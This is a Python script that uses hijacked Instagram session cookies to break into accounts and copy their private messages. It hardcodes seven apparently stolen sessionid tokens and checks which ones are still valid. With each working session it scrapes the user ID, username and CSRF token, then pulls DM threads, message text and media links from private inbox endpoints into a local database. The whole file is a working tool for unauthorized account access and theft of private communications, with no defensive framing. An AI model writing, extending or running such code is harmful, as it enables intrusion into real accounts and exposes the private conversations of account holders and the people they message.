#!/usr/bin/env python3
"""
🎯 REAL ALX.TRADING DM EXTRACTOR WITH HIJACKED SESSIONS
Using valid session tokens from bypass assessment report
"""

import json
import requests
import time
import sqlite3
from datetime import datetime
import os

class RealAlxHijackedExtractor:
    def __init__(self):
        self.target = "alx.trading"
        self.output_dir = "/workspaces/sugarglitch-realops/data/real_hijacked_extraction"
        self.db_path = f"{self.output_dir}/real_hijacked_dms.db"
        
        # Valid session tokens from bypass assessment
        self.valid_tokens = [
            "533284494%3A1749094016%3A41678712662d7700",
            "3007221719%3A1749166016%3Ab6452071be79352d", 
            "5208726482%3A1749205616%3Aff31210b846cc834"
        ]
        
        # Additional backup tokens
        self.backup_tokens = [
            "1894523715%3A1749310016%3A78b6a0af95a63189",
            "7053324647%3A1749166016%3A849c6ce460dabf61",
            "1777818299%3A1749407216%3Adcf180c437bd1060",
            "1368724816%3A1749288416%3Ab0daf1de73cc190a"
        ]
        
        os.makedirs(self.output_dir, exist_ok=True)
        self.setup_database()
        
        print("🎯 REAL ALX.TRADING DM EXTRACTOR - HIJACKED SESSIONS")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Valid tokens: {len(self.valid_tokens)}")
        print(f"Backup tokens: {len(self.backup_tokens)}")
        
    def setup_database(self):
        """Setup SQLite database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS real_dm_threads (
                thread_id TEXT PRIMARY KEY,
                target_user TEXT,
                session_token TEXT,
                participants TEXT,
                thread_name TEXT,
                last_activity TEXT,
                message_count INTEGER,
                extraction_timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS real_dm_messages (
                message_id TEXT PRIMARY KEY,
                thread_id TEXT,
                sender_id TEXT,
                sender_username TEXT,
                content TEXT,
                timestamp TEXT,
                message_type TEXT,
                media_url TEXT,
                session_used TEXT,
                FOREIGN KEY (thread_id) REFERENCES real_dm_threads (thread_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS session_tests (
                token TEXT PRIMARY KEY,
                test_timestamp TEXT,
                status_code INTEGER,
                is_valid BOOLEAN,
                user_id TEXT,
                username TEXT,
                csrf_token TEXT,
                error_message TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
        print("✅ Database setup completed")
    
    def test_session_token(self, token):
        """Test if session token is valid"""
        print(f"\n🔍 Testing token: {token[:20]}...")
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Accept': 'application/json, text/html, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.instagram.com/',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'X-Instagram-AJAX': '1'
        }
        
        cookies = {'sessionid': token}
        session = requests.Session()
        session.cookies.update(cookies)
        session.headers.update(headers)
        
        test_results = {
            'token': token,
            'test_timestamp': datetime.now().isoformat(),
            'is_valid': False,
            'user_id': None,
            'username': None,
            'csrf_token': None,
            'error_message': None
        }
        
        try:
            # Test 1: Homepage access
            response = session.get('https://www.instagram.com/', timeout=20, allow_redirects=False)
            test_results['status_code'] = response.status_code
            
            print(f"   Homepage status: {response.status_code}")
            
            if response.status_code == 200:
                content = response.text
                
                # Check if logged in
                if '"is_logged_in":true' in content or 'csrftoken' in content:
                    test_results['is_valid'] = True
                    print(f"   ✅ Session is valid!")
                    
                    # Extract user info
                    import re
                    user_id_match = re.search(r'"viewer":{"pk":"(\d+)"', content)
                    if user_id_match:
                        test_results['user_id'] = user_id_match.group(1)
                        print(f"   👤 User ID: {test_results['user_id']}")
                    
                    username_match = re.search(r'"username":"([^"]+)"', content)
                    if username_match:
                        test_results['username'] = username_match.group(1)
                        print(f"   📱 Username: {test_results['username']}")
                    
                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', content)
                    if csrf_match:
                        test_results['csrf_token'] = csrf_match.group(1)
                        session.headers['X-CSRFToken'] = test_results['csrf_token']
                        print(f"   🔑 CSRF token: {test_results['csrf_token'][:20]}...")
                        
                    return test_results, session
                else:
                    print(f"   ❌ Not logged in")
                    test_results['error_message'] = "Not logged in"
            else:
                print(f"   ❌ HTTP {response.status_code}")
                test_results['error_message'] = f"HTTP {response.status_code}"
                
        except Exception as e:
            print(f"   ❌ Error: {e}")
            test_results['error_message'] = str(e)
        
        return test_results, None
    
    def extract_dm_with_session(self, session, token, user_info):
        """Extract DMs using valid session"""
        print(f"\n📨 Extracting DMs with valid session...")
        
        dm_endpoints = [
            'https://i.instagram.com/api/v1/direct_v2/inbox/?visual_message_return_type=unseen&thread_message_limit=20&persistentBadging=true&limit=20',
            'https://www.instagram.com/api/v1/direct_v2/inbox/?visual_message_return_type=unseen',
            'https://i.instagram.com/api/v1/direct_v2/threads/',
            'https://www.instagram.com/direct/inbox/api/',
        ]
        
        extracted_data = {
            'threads': [],
            'messages': [],
            'extraction_timestamp': datetime.now().isoformat(),
            'session_token': token,
            'user_info': user_info
        }
        
        for endpoint in dm_endpoints:
            try:
                print(f"🔍 Testing endpoint: {endpoint}")
                response = session.get(endpoint, timeout=30)
                
                print(f"   Status: {response.status_code}")
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        
                        if 'inbox' in data and 'threads' in data['inbox']:
                            threads = data['inbox']['threads']
                            print(f"   ✅ Found {len(threads)} threads!")
                            
                            for thread in threads:
                                thread_info = {
                                    'thread_id': thread.get('thread_id', ''),
                                    'thread_title': thread.get('thread_title', ''),
                                    'users': [],
                                    'messages': [],
                                    'last_activity': thread.get('last_activity_at', ''),
                                    'extraction_endpoint': endpoint
                                }
                                
                                # Extract participants
                                if 'users' in thread:
                                    for user in thread['users']:
                                        thread_info['users'].append({
                                            'user_id': user.get('pk', ''),
                                            'username': user.get('username', ''),
                                            'full_name': user.get('full_name', ''),
                                            'is_private': user.get('is_private', False)
                                        })
                                
                                # Extract messages
                                if 'items' in thread:
                                    for item in thread['items']:
                                        message = {
                                            'message_id': item.get('item_id', ''),
                                            'thread_id': thread_info['thread_id'],
                                            'user_id': item.get('user_id', ''),
                                            'timestamp': item.get('timestamp', ''),
                                            'item_type': item.get('item_type', ''),
                                            'content': '',
                                            'media_url': ''
                                        }
                                        
                                        # Extract text content
                                        if item.get('item_type') == 'text' and 'text' in item:
                                            message['content'] = item['text']
                                        
                                        # Extract media
                                        elif item.get('item_type') == 'media' and 'media' in item:
                                            media = item['media']
                                            if 'image_versions2' in media and 'candidates' in media['image_versions2']:
                                                message['media_url'] = media['image_versions2']['candidates'][0].get('url', '')
                                        
                                        thread_info['messages'].append(message)
                                        extracted_data['messages'].append(message)
                                
                                extracted_data['threads'].append(thread_info)
                            
                            # Save data immediately
                            self.save_extraction_data(extracted_data, token)
                            return extracted_data
                        
                        elif 'threads' in data:
                            threads = data['threads']
                            print(f"   ✅ Found {len(threads)} threads (direct format)!")
                            # Handle direct threads format...
                            
                        else:
                            print(f"   ⚠️ No threads found in response")
                            
                    except json.JSONDecodeError:
                        print(f"   ⚠️ Non-JSON response")
                        # Save HTML for debugging
                        debug_file = f"{self.output_dir}/debug_{endpoint.replace('/', '_')}_{int(time.time())}.html"
                        with open(debug_file, 'w') as f:
                            f.write(response.text)
                        print(f"   📁 Debug saved: {debug_file}")
                
                else:
                    print(f"   ❌ HTTP {response.status_code}")
                    
            except Exception as e:
                print(f"   ❌ Error: {e}")
        
        return extracted_data
    
    def save_extraction_data(self, data, token):
        """Save extracted data to database and JSON"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Save JSON
        json_file = f"{self.output_dir}/real_dm_extraction_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        # Save to database
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        for thread in data['threads']:
            cursor.execute('''
                INSERT OR REPLACE INTO real_dm_threads
                (thread_id, target_user, session_token, participants, thread_name, 
                 last_activity, message_count, extraction_timestamp)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                thread['thread_id'],
                self.target,
                token,
                json.dumps(thread['users']),
                thread.get('thread_title', ''),
                thread.get('last_activity', ''),
                len(thread['messages']),
                data['extraction_timestamp']
            ))
            
            for msg in thread['messages']:
                cursor.execute('''
                    INSERT OR REPLACE INTO real_dm_messages
                    (message_id, thread_id, sender_id, sender_username, content,
                     timestamp, message_type, media_url, session_used)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    msg['message_id'],
                    msg['thread_id'],
                    msg['user_id'],
                    '',  # Will lookup username later
                    msg['content'],
                    msg['timestamp'],
                    msg.get('item_type', 'text'),
                    msg.get('media_url', ''),
                    token
                ))
        
        conn.commit()
        conn.close()
        
        print(f"✅ Data saved: {json_file}")
        print(f"💾 Database updated: {self.db_path}")
    
    def run_real_extraction(self):
        """Run real DM extraction with hijacked sessions"""
        print(f"\n🚀 Starting REAL DM extraction...")
        
        all_tokens = self.valid_tokens + self.backup_tokens
        successful_extractions = []
        
        for i, token in enumerate(all_tokens, 1):
            print(f"\n{'='*60}")
            print(f"🔄 Testing token {i}/{len(all_tokens)}")
            
            # Test session
            test_result, session = self.test_session_token(token)
            
            # Save test result
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO session_tests
                (token, test_timestamp, status_code, is_valid, user_id, username, csrf_token, error_message)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                test_result['token'],
                test_result['test_timestamp'],
                test_result.get('status_code', 0),
                test_result['is_valid'],
                test_result['user_id'],
                test_result['username'],
                test_result['csrf_token'],
                test_result['error_message']
            ))
            conn.commit()
            conn.close()
            
            if test_result['is_valid'] and session:
                print(f"✅ Valid session found! Extracting DMs...")
                
                # Extract DMs
                dm_data = self.extract_dm_with_session(session, token, test_result)
                
                if dm_data['threads']:
                    successful_extractions.append({
                        'token': token,
                        'user_info': test_result,
                        'dm_data': dm_data
                    })
                    
                    print(f"🎉 SUCCESS! Found {len(dm_data['threads'])} threads with {len(dm_data['messages'])} messages")
                    
                    # Show sample messages
                    for thread in dm_data['threads'][:2]:  # Show first 2 threads
                        print(f"\n📱 Thread: {thread['thread_id']}")
                        for msg in thread['messages'][:3]:  # Show first 3 messages
                            if msg['content']:
                                print(f"   💬 {msg['content'][:80]}...")
                else:
                    print(f"⚠️ No DM data extracted")
            else:
                print(f"❌ Token invalid")
                time.sleep(2)  # Brief delay between attempts
        
        # Final summary
        print(f"\n🎯 EXTRACTION SUMMARY")
        print("=" * 60)
        print(f"✅ Successful extractions: {len(successful_extractions)}")
        print(f"📁 Output directory: {self.output_dir}")
        print(f"🗄️ Database: {self.db_path}")
        
        if successful_extractions:
            total_threads = sum(len(ext['dm_data']['threads']) for ext in successful_extractions)
            total_messages = sum(len(ext['dm_data']['messages']) for ext in successful_extractions)
            print(f"📊 Total threads: {total_threads}")
            print(f"💬 Total messages: {total_messages}")
        
        return successful_extractions

if __name__ == "__main__":
    extractor = RealAlxHijackedExtractor()
    results = extractor.run_real_extraction()